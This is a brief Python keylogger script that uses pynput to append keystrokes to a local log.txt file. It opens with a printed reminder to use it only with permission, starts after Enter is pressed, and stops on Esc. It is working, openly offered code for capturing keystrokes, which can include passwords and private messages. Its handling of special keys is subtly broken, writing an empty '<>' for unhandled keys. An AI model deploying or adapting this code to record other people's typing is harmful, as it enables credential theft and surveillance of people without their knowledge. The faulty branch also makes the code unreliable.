from pynput.keyboard import Listener,Key,KeyCode

log_file = "log.txt"

def write_to_file(key):
    letter = ""
    try:
        # For character keys
        if isinstance(key, KeyCode):
            letter = key.char
        else:
            raise AttributeError
    except AttributeError:
        # For special keys
        if key == Key.space:
            letter = ' '
        elif key == Key.enter:
            letter = '\n'
        elif key == Key.backspace:
            letter = '<backspace>'
        elif key in {Key.shift, Key.shift_l, Key.shift_r}:
            letter = '<shift>'
        elif key in {Key.ctrl, Key.ctrl_l, Key.ctrl_r}:
            letter = '<ctrl>'
        elif key == Key.esc:
            return False
        else:
            # Handle function keys and other non-character keys
            letter = f'<{letter}>'

    with open(log_file,"a") as file:
        file.write(letter)

def main():
    # Display security message
    print("Security Considerations:")
    print("Remember to use this keylogger ethically and legally, only in situations where you have explicit permission.")
    input("Press Enter to start logging keystrokes...")
    print("Press 'Esc' key to stop the program and end logging.")

    with Listener(on_press= write_to_file) as listen:
        listen.join()

if __name__ == "__main__":
    main()

#end of program